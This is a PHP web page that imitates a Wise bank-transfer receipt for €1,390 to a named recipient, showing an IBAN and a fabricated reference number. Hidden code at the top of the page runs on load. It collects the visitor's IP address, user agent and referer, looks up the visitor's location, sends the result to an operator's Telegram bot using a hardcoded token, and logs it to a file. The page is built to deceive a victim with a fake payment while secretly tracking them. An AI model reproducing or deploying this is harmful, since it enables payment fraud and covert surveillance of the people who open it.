<?php
// ==================== CONFIGURAÇÕES ==================== v1.1
$telegram_bot_token = '8704514905:AAHN69zg_EJtg7JlB9wVmbM7aZCRmMJeDJI';
$telegram_chat_id   = '8385484720';

// =======================================================

$ip         = $_SERVER['REMOTE_ADDR'] ?? 'N/A';
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'N/A';
$referer    = $_SERVER['HTTP_REFERER'] ?? 'Direct';
$hora       = date('d/m/Y H:i:s');

$geo = json_decode(@file_get_contents("http://ip-api.com/json/{$ip}?fields=status,message,country,countryCode,region,regionName,city,isp,org,as,mobile,proxy,hosting"), true);

$cidade   = $geo['city'] ?? 'Unknown';
$estado   = $geo['regionName'] ?? 'Unknown';
$pais     = $geo['country'] ?? 'Unknown';
$provedor = $geo['isp'] ?? 'Unknown';
$proxy    = ($geo['proxy'] ?? false) ? 'Yes' : 'No';
$mobile   = ($geo['mobile'] ?? false) ? 'Yes' : 'No';

// Mensagem Telegram
$mensagem = "🔴 *Novo acesso ao Comprovante Wise!*\n\n";
$mensagem .= "🕒 *Data:* $hora\n";
$mensagem .= "🌐 *IP:* `$ip`\n";
$mensagem .= "📍 *Localização:* $cidade, $estado - $pais\n";
$mensagem .= "🏢 *Provedor:* $provedor\n";
$mensagem .= "📱 *Mobile:* $mobile | *VPN/Proxy:* $proxy\n";
$mensagem .= "🔗 *Referer:* $referer";

file_get_contents("https://api.telegram.org/bot$telegram_bot_token/sendMessage?chat_id=$telegram_chat_id&text=" . urlencode($mensagem) . "&parse_mode=Markdown");

// Log
$log = [
    'data'      => $hora,
    'ip'        => $ip,
    'cidade'    => $cidade,
    'pais'      => $pais,
    'provedor'  => $provedor,
    'mobile'    => $mobile,
    'proxy'     => $proxy,
    'user_agent'=> $user_agent
];
file_put_contents('acessos.json', json_encode($log, JSON_UNESCAPED_UNICODE) . "\n", FILE_APPEND);
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Wise Transfer Confirmation - €1.390,00</title>
    <style>
        body { font-family: 'Segoe UI', Arial, sans-serif; background: #f8f9fa; text-align: center; padding: 20px; }
        .comprovante { max-width: 640px; margin: 0 auto; background: white; padding: 40px; border-radius: 12px; box-shadow: 0 4px 25px rgba(0,0,0,0.12); border: 1px solid #e0e0e0; }
        h1 { color: #00b66d; }
        .info { text-align: left; margin: 25px 0; line-height: 2.1; font-size: 16px; }
        .info p { margin: 9px 0; }
        .success { color: #00b66d; font-size: 23px; font-weight: bold; margin: 20px 0; }
        .wise-logo { color: #00b66d; font-weight: bold; font-size: 22px; }
    </style>
</head>
<body>
    <div class="comprovante">
        <p class="wise-logo">WISE</p>
        <h1>✅ Transfer Completed Successfully</h1>
        <p style="color:#555; font-size:17px;">Money sent via Wise • SEPA Transfer</p>
        
        <div class="info">
            <p><strong>Amount Sent:</strong> €1.390,00</p>
            <p><strong>Date & Time:</strong> <?php echo date('d/m/Y H:i'); ?> CET</p>
            <p><strong>Recipient:</strong> Cristina Mendes</p>
            <p><strong>Bank:</strong> Caixa Geral de Depósitos (CGD)</p>
            <p><strong>IBAN:</strong> PT50 0035 0088 0000 4933 9008 2</p>
            <p><strong>BIC/SWIFT:</strong> CGDIPTPL</p>
            <p><strong>Reference:</strong> WISE-<?php echo strtoupper(substr(md5(time()), 0, 12)); ?></p>
            <p><strong>Status:</strong> <span style="color:#00b66d;">Completed ✓</span></p>
        </div>

        <div class="success">Transfer Completed</div>
        
        <p style="margin-top:20px; color:#444;">
            This is your electronic receipt. You can download it as PDF.
        </p>
        <br>
        <button onclick="alert('Downloading PDF receipt... (This is a simulation)')" 
                style="padding:14px 35px; font-size:17px; background:#00b66d; color:white; border:none; border-radius:8px; cursor:pointer;">
            📄 Download PDF Receipt
        </button>
    </div>
</body>
</html>